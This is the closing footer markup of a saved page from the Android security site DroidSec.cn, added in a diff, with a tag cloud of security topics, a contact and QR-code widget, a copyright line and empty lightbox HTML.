+<a href="http://www.droidsec.cn/tag/android-backup/" class="tag-link-21" title="1个话题" style="font-size: 13pt;">Android Backup</a>
+<a href="http://www.droidsec.cn/tag/gui/" class="tag-link-35" title="2个话题" style="font-size: 13pt;">GUI</a>
+<a href="http://www.droidsec.cn/tag/android-system/" class="tag-link-12" title="2个话题" style="font-size: 13pt;">Android System</a>
+<a href="http://www.droidsec.cn/tag/uri/" class="tag-link-46" title="2个话题" style="font-size: 13pt;">URI</a>
+<a href="http://www.droidsec.cn/tag/uc/" class="tag-link-53" title="2个话题" style="font-size: 13pt;">UC</a>
+<a href="http://www.droidsec.cn/tag/gid/" class="tag-link-89" title="2个话题" style="font-size: 13pt;">GID</a>
+<a href="http://www.droidsec.cn/tag/uxss/" class="tag-link-74" title="2个话题" style="font-size: 13pt;">UXSS</a>
+<a href="http://www.droidsec.cn/tag/apk/" class="tag-link-15" title="3个话题" style="font-size: 13pt;">APK</a>
+<a href="http://www.droidsec.cn/tag/jeb/" class="tag-link-44" title="3个话题" style="font-size: 13pt;">JEB</a>
+<a href="http://www.droidsec.cn/tag/drozer/" class="tag-link-76" title="3个话题" style="font-size: 13pt;">Drozer</a>
+<a href="http://www.droidsec.cn/tag/api/" class="tag-link-59" title="3个话题" style="font-size: 13pt;">API</a>
+<a href="http://www.droidsec.cn/tag/poc/" class="tag-link-16" title="4个话题" style="font-size: 13pt;">POC</a>              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-3 col-md-3">
+            <div class="uazoh7-widget uazoh7-about-widget">
+              <h3>关注 | 联系</h3>
+              <div class="uazoh7-widget-inner">                  <img src="WebView 远程代码执行漏洞浅析 _ DroidSec.cn_files/3d563857728b88c4f666a9d9adb4c2ed_qrcode.png" alt="DroidSec.cn qr-code">				  <p class="contacts" style="border-top-width: 1px; margin-top: 30px;"><i class="fa fa-envelope"></i> DroidSec#QQ.com</p>              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-12">
+            <div class="uazoh7-widget uazoh7-copyright-widget">
+              <div class="uazoh7-widget-inner">
+                <p>© Copyright 2015 by DroidSec.cn. All Rights Reserved.</p>
+                <p><a href="http://weibo.com/androidsec">更多安卓安全资讯请关注本站微博</a> </p>
+              </div>
+            </div>
+          </div>        </div>
+      </div>
+</footer>
+
+
+
+
+
+
+
+
+<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div><button type="button" id="cboxClose"></button></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div></div>
+
+ </body></html>
